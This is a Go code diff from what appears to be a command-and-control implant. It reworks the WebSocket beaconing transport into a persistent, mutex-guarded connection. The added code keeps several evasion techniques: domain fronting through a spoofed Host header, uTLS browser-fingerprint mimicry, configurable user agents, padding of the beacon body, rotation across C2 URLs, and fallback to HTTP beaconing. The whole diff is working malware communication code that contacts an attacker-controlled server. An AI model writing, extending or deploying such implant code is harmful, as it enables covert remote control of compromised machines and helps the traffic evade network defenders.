@@ -8,23 +8,29 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
 )
 
+var (
+	wssMu      sync.Mutex
+	wssConn    *websocket.Conn
+	wssConnURL string
+	// wssRoundTripMu serializes full round-trips (dial + write + read) so
+	// concurrent callers cannot interleave frames on the shared connection.
+	wssRoundTripMu sync.Mutex
+)
+
 func sendWSSBeacon(body []byte) []byte {
 	startIdx := int(currentC2Idx.Load())
 	urls := c2URLsSnapshot()
-	// Real body-length jitter (the WS frame carries the padded payload; the
-	// server strips the 8-byte length prefix like it does on the HTTP path).
 	body = padBeaconBody(body)
 	for i := 0; i < len(urls); i++ {
 		idx := (startIdx + i) % len(urls)
 		c2URL := urls[idx]
-
 		beaconURI := beaconWSURI()
-
 		wsURL, err := buildWSURL(c2URL, beaconURI)
 		if err != nil {
 			if Debug {
@@ -32,53 +38,13 @@ func sendWSSBeacon(body []byte) []byte {
 			}
 			continue
 		}
-
-		var dialer *websocket.Dialer
-		dialer = &websocket.Dialer{
-			HandshakeTimeout: 10 * time.Second,
-			NetDialContext:   utlsDialContext,
-		}
-
-		header := http.Header{}
-		if DomainFront != "" {
-			header.Set("Host", DomainFront)
-		}
-		header.Set("User-Agent", getActiveUserAgentFromConfig())
-		for k, v := range getActiveHeaders() {
-			if strings.EqualFold(k, "User-Agent") {
-				continue
-			}
-			header.Set(k, v)
-		}
-
-		conn, _, err := dialer.Dial(wsURL, header)
+		resp, err := wssRoundTrip(wsURL, body)
 		if err != nil {
 			if Debug {
 				fmt.Printf("[!] WS beacon to %s failed: %v\n", wsURL, err)
 			}
 			continue
 		}
-
-		conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
-		err = conn.WriteMessage(websocket.TextMessage, body)
-		if err != nil {
-			if Debug {
-				fmt.Printf("[!] WS write to %s failed: %v\n", wsURL, err)
-			}
-			conn.Close()
-			continue
-		}
-
-		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
-		_, resp, err := conn.ReadMessage()
-		conn.Close()
-		if err != nil {
-			if Debug {
-				fmt.Printf("[!] WS read from %s failed: %v\n", wsURL, err)
-			}
-			continue
-		}
-
 		currentC2Idx.Store(int32(idx))
 		if Debug {
 			fmt.Printf("[+] WS Beacon OK from %s, response %d bytes\n", wsURL, len(resp))
@@ -86,19 +52,84 @@ func sendWSSBeacon(body []byte) []byte {
 		return resp
 	}
 
-	if Debug {
-		fmt.Println("[!] All WS endpoints failed, falling back to HTTP")
-	}
-	// Loud, non-debug failure: WSS is the configured primary transport and
-	// every endpoint failed. Without this the beacon silently falls back to
-	// HTTPS POST while the operator believes WSS is live.
-	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s), last attempt %s)\n", len(urls), func() string {
-		if len(urls) > 0 {
-			return urls[(startIdx+len(urls)-1)%len(urls)]
-		}
-		return "(none)"
-	}())
+	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s))\n", len(urls))
 	return sendBeacon(body)
+}
+
+func wssRoundTrip(wsURL string, body []byte) ([]byte, error) {
+	wssRoundTripMu.Lock()
+	defer wssRoundTripMu.Unlock()
+	conn, err := wssDial(wsURL)
+	if err != nil {
+		return nil, err
+	}
+	conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
+	// Binary frames: body-length jitter can append non-UTF-8 bytes.
+	if err := conn.WriteMessage(websocket.BinaryMessage, body); err != nil {
+		wssInvalidate()
+		return nil, err
+	}
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+	_, resp, err := conn.ReadMessage()
+	if err != nil {
+		wssInvalidate()
+		return nil, err
+	}
+	return resp, nil
+}
+
+func wssDial(wsURL string) (*websocket.Conn, error) {
+	wssMu.Lock()
+	defer wssMu.Unlock()
+	if wssConn != nil && wssConnURL == wsURL {
+		if err := wssConn.WriteControl(websocket.PingMessage, nil, time.Now().Add(3*time.Second)); err == nil {
+			return wssConn, nil
+		}
+		_ = wssConn.Close()
+		wssConn = nil
+	} else if wssConn != nil {
+		// C2 rotation: the cached connection points at a different endpoint.
+		// Close it BEFORE overwriting, otherwise the old socket (and gorilla's
+		// internal goroutines) leak one connection per rotation.
+		_ = wssConn.Close()
+		wssConn = nil
+	}
+
+	header := http.Header{}
+	if DomainFront != "" {
+		header.Set("Host", DomainFront)
+	}
+	header.Set("User-Agent", getActiveUserAgentFromConfig())
+	for k, v := range getActiveHeaders() {
+		if strings.EqualFold(k, "User-Agent") {
+			continue
+		}
+		header.Set(k, v)
+	}
+	dialer := &websocket.Dialer{
+		HandshakeTimeout: 10 * time.Second,
+		NetDialContext:   utlsDialContext,
+	}
+	conn, _, err := dialer.Dial(wsURL, header)
+	if err != nil {
+		return nil, err
+	}
+	conn.SetPongHandler(func(string) error {
+		_ = conn.SetReadDeadline(time.Now().Add(90 * time.Second))
+		return nil
+	})
+	wssConn = conn
+	wssConnURL = wsURL
+	return conn, nil
+}
+
+func wssInvalidate() {
+	wssMu.Lock()
+	defer wssMu.Unlock()
+	if wssConn != nil {
+		_ = wssConn.Close()
+		wssConn = nil
+	}
 }
 
 func buildWSURL(c2URL, path string) (string, error) {
@@ -106,16 +137,13 @@ func buildWSURL(c2URL, path string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-
 	scheme := "ws"
 	if u.Scheme == "https" || u.Scheme == "wss" {
 		scheme = "wss"
 	}
-
 	host := u.Host
 	if host == "" {
 		host = u.Path
 	}
-
 	return fmt.Sprintf("%s://%s%s", scheme, host, path), nil
 }
